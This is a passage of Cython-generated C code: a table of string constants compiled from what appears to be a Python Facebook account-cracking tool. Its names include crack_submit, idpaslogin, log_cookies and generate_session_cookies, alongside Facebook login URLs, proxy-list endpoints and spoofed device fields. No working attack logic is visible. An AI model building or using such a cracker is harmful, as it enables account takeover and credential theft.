    {&__pyx_n_s_Y55L, __pyx_k_Y55L, sizeof(__pyx_k_Y55L), 0, 0, 1, 1},
    {&__pyx_kp_s_Y5_Dual_SIM_2017, __pyx_k_Y5_Dual_SIM_2017, sizeof(__pyx_k_Y5_Dual_SIM_2017), 0, 0, 1, 0},
    {&__pyx_kp_s_Y5_II, __pyx_k_Y5_II, sizeof(__pyx_k_Y5_II), 0, 0, 1, 0},
    {&__pyx_kp_s_Y5_Prime_2018_Dual_SIM, __pyx_k_Y5_Prime_2018_Dual_SIM, sizeof(__pyx_k_Y5_Prime_2018_Dual_SIM), 0, 0, 1, 0},
    {&__pyx_n_s_Y65, __pyx_k_Y65, sizeof(__pyx_k_Y65), 0, 0, 1, 1},
    {&__pyx_n_s_Y66, __pyx_k_Y66, sizeof(__pyx_k_Y66), 0, 0, 1, 1},
    {&__pyx_n_s_Y69, __pyx_k_Y69, sizeof(__pyx_k_Y69), 0, 0, 1, 1},
    {&__pyx_kp_s_Y6_2018, __pyx_k_Y6_2018, sizeof(__pyx_k_Y6_2018), 0, 0, 1, 0},
    {&__pyx_kp_s_Y6_Dual_SIM_2018, __pyx_k_Y6_Dual_SIM_2018, sizeof(__pyx_k_Y6_Dual_SIM_2018), 0, 0, 1, 0},
    {&__pyx_kp_s_Y6_Prime_2018, __pyx_k_Y6_Prime_2018, sizeof(__pyx_k_Y6_Prime_2018), 0, 0, 1, 0},
    {&__pyx_n_s_Y71, __pyx_k_Y71, sizeof(__pyx_k_Y71), 0, 0, 1, 1},
    {&__pyx_n_s_Y81, __pyx_k_Y81, sizeof(__pyx_k_Y81), 0, 0, 1, 1},
    {&__pyx_n_s_Y83, __pyx_k_Y83, sizeof(__pyx_k_Y83), 0, 0, 1, 1},
    {&__pyx_kp_s_YP_GI1, __pyx_k_YP_GI1, sizeof(__pyx_k_YP_GI1), 0, 0, 1, 0},
    {&__pyx_kp_u_YaApp_Android, __pyx_k_YaApp_Android, sizeof(__pyx_k_YaApp_Android), 0, 1, 0, 0},
    {&__pyx_kp_s_YaBrowser, __pyx_k_YaBrowser, sizeof(__pyx_k_YaBrowser), 0, 0, 1, 0},
    {&__pyx_n_s_Yes, __pyx_k_Yes, sizeof(__pyx_k_Yes), 0, 0, 1, 1},
    {&__pyx_kp_s_Yota_Phone_2, __pyx_k_Yota_Phone_2, sizeof(__pyx_k_Yota_Phone_2), 0, 0, 1, 0},
    {&__pyx_n_s_Zong, __pyx_k_Zong, sizeof(__pyx_k_Zong), 0, 0, 1, 1},
    {&__pyx_kp_s__11, __pyx_k__11, sizeof(__pyx_k__11), 0, 0, 1, 0},
    {&__pyx_kp_u__11, __pyx_k__11, sizeof(__pyx_k__11), 0, 1, 0, 0},
    {&__pyx_kp_s__119, __pyx_k__119, sizeof(__pyx_k__119), 0, 0, 1, 0},
    {&__pyx_kp_s__124, __pyx_k__124, sizeof(__pyx_k__124), 0, 0, 1, 0},
    {&__pyx_n_s__160, __pyx_k__160, sizeof(__pyx_k__160), 0, 0, 1, 1},
    {&__pyx_kp_s__25, __pyx_k__25, sizeof(__pyx_k__25), 0, 0, 1, 0},
    {&__pyx_kp_u__25, __pyx_k__25, sizeof(__pyx_k__25), 0, 1, 0, 0},
    {&__pyx_kp_s__32, __pyx_k__32, sizeof(__pyx_k__32), 0, 0, 1, 0},
    {&__pyx_kp_s__33, __pyx_k__33, sizeof(__pyx_k__33), 0, 0, 1, 0},
    {&__pyx_kp_s__38, __pyx_k__38, sizeof(__pyx_k__38), 0, 0, 1, 0},
    {&__pyx_kp_u__38, __pyx_k__38, sizeof(__pyx_k__38), 0, 1, 0, 0},
    {&__pyx_kp_u__48, __pyx_k__48, sizeof(__pyx_k__48), 0, 1, 0, 0},
    {&__pyx_kp_u__54, __pyx_k__54, sizeof(__pyx_k__54), 0, 1, 0, 0},
    {&__pyx_kp_s__63, __pyx_k__63, sizeof(__pyx_k__63), 0, 0, 1, 0},
    {&__pyx_kp_u__63, __pyx_k__63, sizeof(__pyx_k__63), 0, 1, 0, 0},
    {&__pyx_kp_s__71, __pyx_k__71, sizeof(__pyx_k__71), 0, 0, 1, 0},
    {&__pyx_kp_u__71, __pyx_k__71, sizeof(__pyx_k__71), 0, 1, 0, 0},
    {&__pyx_kp_s__72, __pyx_k__72, sizeof(__pyx_k__72), 0, 0, 1, 0},
    {&__pyx_kp_s__74, __pyx_k__74, sizeof(__pyx_k__74), 0, 0, 1, 0},
    {&__pyx_n_s__75, __pyx_k__75, sizeof(__pyx_k__75), 0, 0, 1, 1},
    {&__pyx_kp_s__77, __pyx_k__77, sizeof(__pyx_k__77), 0, 0, 1, 0},
    {&__pyx_kp_s__83, __pyx_k__83, sizeof(__pyx_k__83), 0, 0, 1, 0},
    {&__pyx_kp_u__84, __pyx_k__84, sizeof(__pyx_k__84), 0, 1, 0, 0},
    {&__pyx_kp_u__85, __pyx_k__85, sizeof(__pyx_k__85), 0, 1, 0, 0},
    {&__pyx_kp_s__88, __pyx_k__88, sizeof(__pyx_k__88), 0, 0, 1, 0},
    {&__pyx_n_s__93, __pyx_k__93, sizeof(__pyx_k__93), 0, 0, 1, 1},
    {&__pyx_n_s_a, __pyx_k_a, sizeof(__pyx_k_a), 0, 0, 1, 1},
    {&__pyx_n_s_aV, __pyx_k_aV, sizeof(__pyx_k_aV), 0, 0, 1, 1},
    {&__pyx_n_s_accept, __pyx_k_accept, sizeof(__pyx_k_accept), 0, 0, 1, 1},
    {&__pyx_kp_s_accept_language, __pyx_k_accept_language, sizeof(__pyx_k_accept_language), 0, 0, 1, 0},
    {&__pyx_n_s_accessToken, __pyx_k_accessToken, sizeof(__pyx_k_accessToken), 0, 0, 1, 1},
    {&__pyx_n_s_adid, __pyx_k_adid, sizeof(__pyx_k_adid), 0, 0, 1, 1},
    {&__pyx_n_s_advertiser_id, __pyx_k_advertiser_id, sizeof(__pyx_k_advertiser_id), 0, 0, 1, 1},
    {&__pyx_n_s_allow_redirects, __pyx_k_allow_redirects, sizeof(__pyx_k_allow_redirects), 0, 0, 1, 1},
    {&__pyx_n_s_android_version, __pyx_k_android_version, sizeof(__pyx_k_android_version), 0, 0, 1, 1},
    {&__pyx_n_s_api1, __pyx_k_api1, sizeof(__pyx_k_api1), 0, 0, 1, 1},
    {&__pyx_n_s_api1_locals_genexpr, __pyx_k_api1_locals_genexpr, sizeof(__pyx_k_api1_locals_genexpr), 0, 0, 1, 1},
    {&__pyx_n_s_api2, __pyx_k_api2, sizeof(__pyx_k_api2), 0, 0, 1, 1},
    {&__pyx_n_s_api2_locals_genexpr, __pyx_k_api2_locals_genexpr, sizeof(__pyx_k_api2_locals_genexpr), 0, 0, 1, 1},
    {&__pyx_n_s_append, __pyx_k_append, sizeof(__pyx_k_append), 0, 0, 1, 1},
    {&__pyx_kp_s_application_x_www_form_urlencode, __pyx_k_application_x_www_form_urlencode, sizeof(__pyx_k_application_x_www_form_urlencode), 0, 0, 1, 0},
    {&__pyx_n_s_approval, __pyx_k_approval, sizeof(__pyx_k_approval), 0, 0, 1, 1},
    {&__pyx_n_s_args, __pyx_k_args, sizeof(__pyx_k_args), 0, 0, 1, 1},
    {&__pyx_n_s_ask, __pyx_k_ask, sizeof(__pyx_k_ask), 0, 0, 1, 1},
    {&__pyx_n_s_asyncio_coroutines, __pyx_k_asyncio_coroutines, sizeof(__pyx_k_asyncio_coroutines), 0, 0, 1, 1},
    {&__pyx_n_s_authenticate, __pyx_k_authenticate, sizeof(__pyx_k_authenticate), 0, 0, 1, 1},
    {&__pyx_n_s_authority, __pyx_k_authority, sizeof(__pyx_k_authority), 0, 0, 1, 1},
    {&__pyx_n_s_b64encode, __pyx_k_b64encode, sizeof(__pyx_k_b64encode), 0, 0, 1, 1},
    {&__pyx_n_s_bV, __pyx_k_bV, sizeof(__pyx_k_bV), 0, 0, 1, 1},
    {&__pyx_n_s_base64, __pyx_k_base64, sizeof(__pyx_k_base64), 0, 0, 1, 1},
    {&__pyx_n_s_bbbb, __pyx_k_bbbb, sizeof(__pyx_k_bbbb), 0, 0, 1, 1},
    {&__pyx_n_s_bln, __pyx_k_bln, sizeof(__pyx_k_bln), 0, 0, 1, 1},
    {&__pyx_n_s_br_virshon, __pyx_k_br_virshon, sizeof(__pyx_k_br_virshon), 0, 0, 1, 1},
    {&__pyx_n_s_build, __pyx_k_build, sizeof(__pyx_k_build), 0, 0, 1, 1},
    {&__pyx_n_s_button_with_disabled, __pyx_k_button_with_disabled, sizeof(__pyx_k_button_with_disabled), 0, 0, 1, 1},
    {&__pyx_n_s_bx, __pyx_k_bx, sizeof(__pyx_k_bx), 0, 0, 1, 1},
    {&__pyx_n_s_bz, __pyx_k_bz, sizeof(__pyx_k_bz), 0, 0, 1, 1},
    {&__pyx_n_s_cV, __pyx_k_cV, sizeof(__pyx_k_cV), 0, 0, 1, 1},
    {&__pyx_n_s_c_user, __pyx_k_c_user, sizeof(__pyx_k_c_user), 0, 0, 1, 1},
    {&__pyx_kp_s_c_user_xs, __pyx_k_c_user_xs, sizeof(__pyx_k_c_user_xs), 0, 0, 1, 0},
    {&__pyx_kp_s_cache_control, __pyx_k_cache_control, sizeof(__pyx_k_cache_control), 0, 0, 1, 0},
    {&__pyx_kp_s_cell_CTRadioAccessTechnologyHSDP, __pyx_k_cell_CTRadioAccessTechnologyHSDP, sizeof(__pyx_k_cell_CTRadioAccessTechnologyHSDP), 0, 0, 1, 0},
    {&__pyx_n_s_check_output, __pyx_k_check_output, sizeof(__pyx_k_check_output), 0, 0, 1, 1},
    {&__pyx_n_s_checkpoint, __pyx_k_checkpoint, sizeof(__pyx_k_checkpoint), 0, 0, 1, 1},
    {&__pyx_n_s_choice, __pyx_k_choice, sizeof(__pyx_k_choice), 0, 0, 1, 1},
    {&__pyx_n_s_choices, __pyx_k_choices, sizeof(__pyx_k_choices), 0, 0, 1, 1},
    {&__pyx_n_s_chorom, __pyx_k_chorom, sizeof(__pyx_k_chorom), 0, 0, 1, 1},
    {&__pyx_n_s_ckk, __pyx_k_ckk, sizeof(__pyx_k_ckk), 0, 0, 1, 1},
    {&__pyx_n_s_class_getitem, __pyx_k_class_getitem, sizeof(__pyx_k_class_getitem), 0, 0, 1, 1},
    {&__pyx_n_s_clear, __pyx_k_clear, sizeof(__pyx_k_clear), 0, 0, 1, 1},
    {&__pyx_n_s_client_country_code, __pyx_k_client_country_code, sizeof(__pyx_k_client_country_code), 0, 0, 1, 1},
    {&__pyx_n_s_cline_in_traceback, __pyx_k_cline_in_traceback, sizeof(__pyx_k_cline_in_traceback), 0, 0, 1, 1},
    {&__pyx_n_s_close, __pyx_k_close, sizeof(__pyx_k_close), 0, 0, 1, 1},
    {&__pyx_n_s_code, __pyx_k_code, sizeof(__pyx_k_code), 0, 0, 1, 1},
    {&__pyx_n_s_coki, __pyx_k_coki, sizeof(__pyx_k_coki), 0, 0, 1, 1},
    {&__pyx_kp_s_com_facebook_account_login_proto, __pyx_k_com_facebook_account_login_proto, sizeof(__pyx_k_com_facebook_account_login_proto), 0, 0, 1, 0},
    {&__pyx_kp_s_com_facebook_katana, __pyx_k_com_facebook_katana, sizeof(__pyx_k_com_facebook_katana), 0, 0, 1, 0},
    {&__pyx_n_s_community_id, __pyx_k_community_id, sizeof(__pyx_k_community_id), 0, 0, 1, 1},
    {&__pyx_n_s_concurrent_futures, __pyx_k_concurrent_futures, sizeof(__pyx_k_concurrent_futures), 0, 0, 1, 1},
    {&__pyx_kp_s_content_type, __pyx_k_content_type, sizeof(__pyx_k_content_type), 0, 0, 1, 0},
    {&__pyx_n_s_cookies, __pyx_k_cookies, sizeof(__pyx_k_cookies), 0, 0, 1, 1},
    {&__pyx_n_s_cph, __pyx_k_cph, sizeof(__pyx_k_cph), 0, 0, 1, 1},
    {&__pyx_n_s_cpl, __pyx_k_cpl, sizeof(__pyx_k_cpl), 0, 0, 1, 1},
    {&__pyx_n_s_cps, __pyx_k_cps, sizeof(__pyx_k_cps), 0, 0, 1, 1},
    {&__pyx_n_s_crack_submit, __pyx_k_crack_submit, sizeof(__pyx_k_crack_submit), 0, 0, 1, 1},
    {&__pyx_n_s_credentials_type, __pyx_k_credentials_type, sizeof(__pyx_k_credentials_type), 0, 0, 1, 1},
    {&__pyx_kp_s_credentials_type_device_based_l, __pyx_k_credentials_type_device_based_l, sizeof(__pyx_k_credentials_type_device_based_l), 0, 0, 1, 0},
    {&__pyx_n_s_crk, __pyx_k_crk, sizeof(__pyx_k_crk), 0, 0, 1, 1},
    {&__pyx_n_s_cudiua1, __pyx_k_cudiua1, sizeof(__pyx_k_cudiua1), 0, 0, 1, 1},
    {&__pyx_n_s_cudiua2, __pyx_k_cudiua2, sizeof(__pyx_k_cudiua2), 0, 0, 1, 1},
    {&__pyx_n_s_cudiua3, __pyx_k_cudiua3, sizeof(__pyx_k_cudiua3), 0, 0, 1, 1},
    {&__pyx_n_s_cudiua4, __pyx_k_cudiua4, sizeof(__pyx_k_cudiua4), 0, 0, 1, 1},
    {&__pyx_n_s_cudiua5, __pyx_k_cudiua5, sizeof(__pyx_k_cudiua5), 0, 0, 1, 1},
    {&__pyx_n_s_cudiua6, __pyx_k_cudiua6, sizeof(__pyx_k_cudiua6), 0, 0, 1, 1},
    {&__pyx_n_s_cudiua7, __pyx_k_cudiua7, sizeof(__pyx_k_cudiua7), 0, 0, 1, 1},
    {&__pyx_n_s_cudiua8, __pyx_k_cudiua8, sizeof(__pyx_k_cudiua8), 0, 0, 1, 1},
    {&__pyx_n_s_currently_logged_in_userid, __pyx_k_currently_logged_in_userid, sizeof(__pyx_k_currently_logged_in_userid), 0, 0, 1, 1},
    {&__pyx_n_s_cx, __pyx_k_cx, sizeof(__pyx_k_cx), 0, 0, 1, 1},
    {&__pyx_n_s_cz, __pyx_k_cz, sizeof(__pyx_k_cz), 0, 0, 1, 1},
    {&__pyx_n_s_data, __pyx_k_data, sizeof(__pyx_k_data), 0, 0, 1, 1},
    {&__pyx_kp_s_data_data_com_termux_files_usr, __pyx_k_data_data_com_termux_files_usr, sizeof(__pyx_k_data_data_com_termux_files_usr), 0, 0, 1, 0},
    {&__pyx_n_s_date, __pyx_k_date, sizeof(__pyx_k_date), 0, 0, 1, 1},
    {&__pyx_n_s_datetime, __pyx_k_datetime, sizeof(__pyx_k_datetime), 0, 0, 1, 1},
    {&__pyx_n_s_day, __pyx_k_day, sizeof(__pyx_k_day), 0, 0, 1, 1},
    {&__pyx_n_s_decode, __pyx_k_decode, sizeof(__pyx_k_decode), 0, 0, 1, 1},
    {&__pyx_kp_s_density_2_25_height, __pyx_k_density_2_25_height, sizeof(__pyx_k_density_2_25_height), 0, 0, 1, 0},
    {&__pyx_n_s_device, __pyx_k_device, sizeof(__pyx_k_device), 0, 0, 1, 1},
    {&__pyx_n_s_device_id, __pyx_k_device_id, sizeof(__pyx_k_device_id), 0, 0, 1, 1},
    {&__pyx_n_s_dic, __pyx_k_dic, sizeof(__pyx_k_dic), 0, 0, 1, 1},
    {&__pyx_n_s_dic2, __pyx_k_dic2, sizeof(__pyx_k_dic2), 0, 0, 1, 1},
    {&__pyx_n_s_digits, __pyx_k_digits, sizeof(__pyx_k_digits), 0, 0, 1, 1},
    {&__pyx_kp_u_disable, __pyx_k_disable, sizeof(__pyx_k_disable), 0, 1, 0, 0},
    {&__pyx_n_s_document, __pyx_k_document, sizeof(__pyx_k_document), 0, 0, 1, 1},
    {&__pyx_n_s_dpr, __pyx_k_dpr, sizeof(__pyx_k_dpr), 0, 0, 1, 1},
    {&__pyx_n_s_e, __pyx_k_e, sizeof(__pyx_k_e), 0, 0, 1, 1},
    {&__pyx_n_s_email, __pyx_k_email, sizeof(__pyx_k_email), 0, 0, 1, 1},
    {&__pyx_kp_s_en_BD_en_GB_q_0_9_en_US_q_0_8_en, __pyx_k_en_BD_en_GB_q_0_9_en_US_q_0_8_en, sizeof(__pyx_k_en_BD_en_GB_q_0_9_en_US_q_0_8_en), 0, 0, 1, 0},
    {&__pyx_n_s_en_GB, __pyx_k_en_GB, sizeof(__pyx_k_en_GB), 0, 0, 1, 1},
    {&__pyx_kp_u_enable, __pyx_k_enable, sizeof(__pyx_k_enable), 0, 1, 0, 0},
    {&__pyx_n_s_enroll_misauth, __pyx_k_enroll_misauth, sizeof(__pyx_k_enroll_misauth), 0, 0, 1, 1},
    {&__pyx_n_s_enter, __pyx_k_enter, sizeof(__pyx_k_enter), 0, 0, 1, 1},
    {&__pyx_n_s_error, __pyx_k_error, sizeof(__pyx_k_error), 0, 0, 1, 1},
    {&__pyx_n_s_error_detail_type, __pyx_k_error_detail_type, sizeof(__pyx_k_error_detail_type), 0, 0, 1, 1},
    {&__pyx_n_s_error_msg, __pyx_k_error_msg, sizeof(__pyx_k_error_msg), 0, 0, 1, 1},
    {&__pyx_n_s_exceptions, __pyx_k_exceptions, sizeof(__pyx_k_exceptions), 0, 0, 1, 1},
    {&__pyx_n_s_exit, __pyx_k_exit, sizeof(__pyx_k_exit), 0, 0, 1, 1},
    {&__pyx_n_s_exit_2, __pyx_k_exit_2, sizeof(__pyx_k_exit_2), 0, 0, 1, 1},
    {&__pyx_n_s_false, __pyx_k_false, sizeof(__pyx_k_false), 0, 0, 1, 1},
    {&__pyx_n_s_family, __pyx_k_family, sizeof(__pyx_k_family), 0, 0, 1, 1},
    {&__pyx_n_s_family_device_id, __pyx_k_family_device_id, sizeof(__pyx_k_family_device_id), 0, 0, 1, 1},
    {&__pyx_n_s_fb_api_caller_class, __pyx_k_fb_api_caller_class, sizeof(__pyx_k_fb_api_caller_class), 0, 0, 1, 1},
    {&__pyx_n_s_fb_api_req_friendly_name, __pyx_k_fb_api_req_friendly_name, sizeof(__pyx_k_fb_api_req_friendly_name), 0, 0, 1, 1},
    {&__pyx_n_s_fban, __pyx_k_fban, sizeof(__pyx_k_fban), 0, 0, 1, 1},
    {&__pyx_n_s_fbav, __pyx_k_fbav, sizeof(__pyx_k_fbav), 0, 0, 1, 1},
    {&__pyx_n_s_fbbd, __pyx_k_fbbd, sizeof(__pyx_k_fbbd), 0, 0, 1, 1},
    {&__pyx_n_s_fbbv, __pyx_k_fbbv, sizeof(__pyx_k_fbbv), 0, 0, 1, 1},
    {&__pyx_n_s_fbca, __pyx_k_fbca, sizeof(__pyx_k_fbca), 0, 0, 1, 1},
    {&__pyx_n_s_fbcr, __pyx_k_fbcr, sizeof(__pyx_k_fbcr), 0, 0, 1, 1},
    {&__pyx_n_s_fbdm, __pyx_k_fbdm, sizeof(__pyx_k_fbdm), 0, 0, 1, 1},
    {&__pyx_n_s_fbdv, __pyx_k_fbdv, sizeof(__pyx_k_fbdv), 0, 0, 1, 1},
    {&__pyx_n_s_fbfw, __pyx_k_fbfw, sizeof(__pyx_k_fbfw), 0, 0, 1, 1},
    {&__pyx_n_s_fblc, __pyx_k_fblc, sizeof(__pyx_k_fblc), 0, 0, 1, 1},
    {&__pyx_n_s_fbmf, __pyx_k_fbmf, sizeof(__pyx_k_fbmf), 0, 0, 1, 1},
    {&__pyx_n_s_fbpn, __pyx_k_fbpn, sizeof(__pyx_k_fbpn), 0, 0, 1, 1},
    {&__pyx_n_s_fbrv, __pyx_k_fbrv, sizeof(__pyx_k_fbrv), 0, 0, 1, 1},
    {&__pyx_n_s_fbsv, __pyx_k_fbsv, sizeof(__pyx_k_fbsv), 0, 0, 1, 1},
    {&__pyx_n_s_file, __pyx_k_file, sizeof(__pyx_k_file), 0, 0, 1, 1},
    {&__pyx_n_s_findall, __pyx_k_findall, sizeof(__pyx_k_findall), 0, 0, 1, 1},
    {&__pyx_n_s_first, __pyx_k_first, sizeof(__pyx_k_first), 0, 0, 1, 1},
    {&__pyx_n_s_flush, __pyx_k_flush, sizeof(__pyx_k_flush), 0, 0, 1, 1},
    {&__pyx_n_s_fn, __pyx_k_fn, sizeof(__pyx_k_fn), 0, 0, 1, 1},
    {&__pyx_n_s_fo, __pyx_k_fo, sizeof(__pyx_k_fo), 0, 0, 1, 1},
    {&__pyx_n_s_format, __pyx_k_format, sizeof(__pyx_k_format), 0, 0, 1, 1},
    {&__pyx_n_s_free_fb, __pyx_k_free_fb, sizeof(__pyx_k_free_fb), 0, 0, 1, 1},
    {&__pyx_kp_u_gc, __pyx_k_gc, sizeof(__pyx_k_gc), 0, 1, 0, 0},
    {&__pyx_n_s_generate_analytics_claims, __pyx_k_generate_analytics_claims, sizeof(__pyx_k_generate_analytics_claims), 0, 0, 1, 1},
    {&__pyx_n_s_generate_machine_id, __pyx_k_generate_machine_id, sizeof(__pyx_k_generate_machine_id), 0, 0, 1, 1},
    {&__pyx_n_s_generate_session_cookies, __pyx_k_generate_session_cookies, sizeof(__pyx_k_generate_session_cookies), 0, 0, 1, 1},
    {&__pyx_n_s_genexpr, __pyx_k_genexpr, sizeof(__pyx_k_genexpr), 0, 0, 1, 1},
    {&__pyx_n_s_get, __pyx_k_get, sizeof(__pyx_k_get), 0, 0, 1, 1},
    {&__pyx_n_s_get_dict, __pyx_k_get_dict, sizeof(__pyx_k_get_dict), 0, 0, 1, 1},
    {&__pyx_kp_s_getprop_gsm_operator_alpha, __pyx_k_getprop_gsm_operator_alpha, sizeof(__pyx_k_getprop_gsm_operator_alpha), 0, 0, 1, 0},
    {&__pyx_kp_s_getprop_ro_build_id, __pyx_k_getprop_ro_build_id, sizeof(__pyx_k_getprop_ro_build_id), 0, 0, 1, 0},
    {&__pyx_kp_s_getprop_ro_build_version_release, __pyx_k_getprop_ro_build_version_release, sizeof(__pyx_k_getprop_ro_build_version_release), 0, 0, 1, 0},
    {&__pyx_kp_s_getprop_ro_hwui_text_large_cache, __pyx_k_getprop_ro_hwui_text_large_cache, sizeof(__pyx_k_getprop_ro_hwui_text_large_cache), 0, 0, 1, 0},
    {&__pyx_kp_s_getprop_ro_hwui_text_large_cache_2, __pyx_k_getprop_ro_hwui_text_large_cache_2, sizeof(__pyx_k_getprop_ro_hwui_text_large_cache_2), 0, 0, 1, 0},
    {&__pyx_kp_s_getprop_ro_product_brand, __pyx_k_getprop_ro_product_brand, sizeof(__pyx_k_getprop_ro_product_brand), 0, 0, 1, 0},
    {&__pyx_kp_s_getprop_ro_product_cpu_abilist, __pyx_k_getprop_ro_product_cpu_abilist, sizeof(__pyx_k_getprop_ro_product_cpu_abilist), 0, 0, 1, 0},
    {&__pyx_kp_s_getprop_ro_product_manufacturer, __pyx_k_getprop_ro_product_manufacturer, sizeof(__pyx_k_getprop_ro_product_manufacturer), 0, 0, 1, 0},
    {&__pyx_kp_s_getprop_ro_product_model, __pyx_k_getprop_ro_product_model, sizeof(__pyx_k_getprop_ro_product_model), 0, 0, 1, 0},
    {&__pyx_n_s_getuid, __pyx_k_getuid, sizeof(__pyx_k_getuid), 0, 0, 1, 1},
    {&__pyx_n_s_group, __pyx_k_group, sizeof(__pyx_k_group), 0, 0, 1, 1},
    {&__pyx_kp_s_gzip_deflate, __pyx_k_gzip_deflate, sizeof(__pyx_k_gzip_deflate), 0, 0, 1, 0},
    {&__pyx_n_s_hash_id, __pyx_k_hash_id, sizeof(__pyx_k_hash_id), 0, 0, 1, 1},
    {&__pyx_n_s_hashlib, __pyx_k_hashlib, sizeof(__pyx_k_hashlib), 0, 0, 1, 1},
    {&__pyx_n_s_head, __pyx_k_head, sizeof(__pyx_k_head), 0, 0, 1, 1},
    {&__pyx_n_s_headers, __pyx_k_headers, sizeof(__pyx_k_headers), 0, 0, 1, 1},
    {&__pyx_n_s_hexdigits, __pyx_k_hexdigits, sizeof(__pyx_k_hexdigits), 0, 0, 1, 1},
    {&__pyx_n_s_https, __pyx_k_https, sizeof(__pyx_k_https), 0, 0, 1, 1},
    {&__pyx_kp_s_https_api_facebook_com_method_au, __pyx_k_https_api_facebook_com_method_au, sizeof(__pyx_k_https_api_facebook_com_method_au), 0, 0, 1, 0},
    {&__pyx_kp_s_https_api_proxyscrape_com_reques, __pyx_k_https_api_proxyscrape_com_reques, sizeof(__pyx_k_https_api_proxyscrape_com_reques), 0, 0, 1, 0},
    {&__pyx_kp_s_https_api_proxyscrape_com_v2_req, __pyx_k_https_api_proxyscrape_com_v2_req, sizeof(__pyx_k_https_api_proxyscrape_com_v2_req), 0, 0, 1, 0},
    {&__pyx_kp_s_https_fgsrsvb_blogspot_com_2024, __pyx_k_https_fgsrsvb_blogspot_com_2024, sizeof(__pyx_k_https_fgsrsvb_blogspot_com_2024), 0, 0, 1, 0},
    {&__pyx_kp_u_https_graph_facebook_com, __pyx_k_https_graph_facebook_com, sizeof(__pyx_k_https_graph_facebook_com), 0, 1, 0, 0},
    {&__pyx_kp_s_https_graph_facebook_com_auth_lo, __pyx_k_https_graph_facebook_com_auth_lo, sizeof(__pyx_k_https_graph_facebook_com_auth_lo), 0, 0, 1, 0},
    {&__pyx_kp_s_https_graph_facebook_com_method, __pyx_k_https_graph_facebook_com_method, sizeof(__pyx_k_https_graph_facebook_com_method), 0, 0, 1, 0},
    {&__pyx_kp_s_https_mbasic_facebook_com, __pyx_k_https_mbasic_facebook_com, sizeof(__pyx_k_https_mbasic_facebook_com), 0, 0, 1, 0},
    {&__pyx_kp_s_https_mbasic_facebook_com_login, __pyx_k_https_mbasic_facebook_com_login, sizeof(__pyx_k_https_mbasic_facebook_com_login), 0, 0, 1, 0},
    {&__pyx_kp_s_https_raw_githubusercontent_com, __pyx_k_https_raw_githubusercontent_com, sizeof(__pyx_k_https_raw_githubusercontent_com), 0, 0, 1, 0},
    {&__pyx_n_s_httpx, __pyx_k_httpx, sizeof(__pyx_k_httpx), 0, 0, 1, 1},
    {&__pyx_n_s_i, __pyx_k_i, sizeof(__pyx_k_i), 0, 0, 1, 1},
    {&__pyx_n_s_id, __pyx_k_id, sizeof(__pyx_k_id), 0, 0, 1, 1},
    {&__pyx_n_s_idpaslogin, __pyx_k_idpaslogin, sizeof(__pyx_k_idpaslogin), 0, 0, 1, 1},
    {&__pyx_n_s_ids, __pyx_k_ids, sizeof(__pyx_k_ids), 0, 0, 1, 1},
    {&__pyx_n_s_import, __pyx_k_import, sizeof(__pyx_k_import), 0, 0, 1, 1},
    {&__pyx_n_s_initializing, __pyx_k_initializing, sizeof(__pyx_k_initializing), 0, 0, 1, 1},
    {&__pyx_n_s_input, __pyx_k_input, sizeof(__pyx_k_input), 0, 0, 1, 1},
    {&__pyx_n_s_is_coroutine, __pyx_k_is_coroutine, sizeof(__pyx_k_is_coroutine), 0, 0, 1, 1},
    {&__pyx_kp_u_isenabled, __pyx_k_isenabled, sizeof(__pyx_k_isenabled), 0, 1, 0, 0},
    {&__pyx_n_s_items, __pyx_k_items, sizeof(__pyx_k_items), 0, 0, 1, 1},
    {&__pyx_n_s_j1, __pyx_k_j1, sizeof(__pyx_k_j1), 0, 0, 1, 1},
    {&__pyx_n_s_jazoest, __pyx_k_jazoest, sizeof(__pyx_k_jazoest), 0, 0, 1, 1},
    {&__pyx_n_s_join, __pyx_k_join, sizeof(__pyx_k_join), 0, 0, 1, 1},
    {&__pyx_n_s_json, __pyx_k_json, sizeof(__pyx_k_json), 0, 0, 1, 1},
    {&__pyx_n_s_k, __pyx_k_k, sizeof(__pyx_k_k), 0, 0, 1, 1},
    {&__pyx_n_s_key, __pyx_k_key, sizeof(__pyx_k_key), 0, 0, 1, 1},
    {&__pyx_n_s_keys, __pyx_k_keys, sizeof(__pyx_k_keys), 0, 0, 1, 1},
    {&__pyx_n_s_kiron, __pyx_k_kiron, sizeof(__pyx_k_kiron), 0, 0, 1, 1},
    {&__pyx_n_s_kkkkki, __pyx_k_kkkkki, sizeof(__pyx_k_kkkkki), 0, 0, 1, 1},
    {&__pyx_n_s_last, __pyx_k_last, sizeof(__pyx_k_last), 0, 0, 1, 1},
    {&__pyx_n_s_li, __pyx_k_li, sizeof(__pyx_k_li), 0, 0, 1, 1},
    {&__pyx_n_s_li2, __pyx_k_li2, sizeof(__pyx_k_li2), 0, 0, 1, 1},
    {&__pyx_n_s_light, __pyx_k_light, sizeof(__pyx_k_light), 0, 0, 1, 1},
    {&__pyx_n_s_limit, __pyx_k_limit, sizeof(__pyx_k_limit), 0, 0, 1, 1},
    {&__pyx_n_s_linex, __pyx_k_linex, sizeof(__pyx_k_linex), 0, 0, 1, 1},
    {&__pyx_n_s_ln, __pyx_k_ln, sizeof(__pyx_k_ln), 0, 0, 1, 1},
    {&__pyx_n_s_locale, __pyx_k_locale, sizeof(__pyx_k_locale), 0, 0, 1, 1},
    {&__pyx_n_s_localtime, __pyx_k_localtime, sizeof(__pyx_k_localtime), 0, 0, 1, 1},
    {&__pyx_n_s_log_cookies, __pyx_k_log_cookies, sizeof(__pyx_k_log_cookies), 0, 0, 1, 1},
    {&__pyx_n_s_logged_out_id, __pyx_k_logged_out_id, sizeof(__pyx_k_logged_out_id), 0, 0, 1, 1},
    {&__pyx_n_s_login, __pyx_k_login, sizeof(__pyx_k_login), 0, 0, 1, 1},
    {&__pyx_n_s_logo, __pyx_k_logo, sizeof(__pyx_k_logo), 0, 0, 1, 1},
    {&__pyx_n_s_loop, __pyx_k_loop, sizeof(__pyx_k_loop), 0, 0, 1, 1},
    {&__pyx_n_s_love, __pyx_k_love, sizeof(__pyx_k_love), 0, 0, 1, 1},
    {&__pyx_n_s_lower, __pyx_k_lower, sizeof(__pyx_k_lower), 0, 0, 1, 1},
    {&__pyx_n_s_lsd, __pyx_k_lsd, sizeof(__pyx_k_lsd), 0, 0, 1, 1},
    {&__pyx_n_s_lt, __pyx_k_lt, sizeof(__pyx_k_lt), 0, 0, 1, 1},
    {&__pyx_n_s_ltx, __pyx_k_ltx, sizeof(__pyx_k_ltx), 0, 0, 1, 1},
    {&__pyx_n_s_m_ts, __pyx_k_m_ts, sizeof(__pyx_k_m_ts), 0, 0, 1, 1},
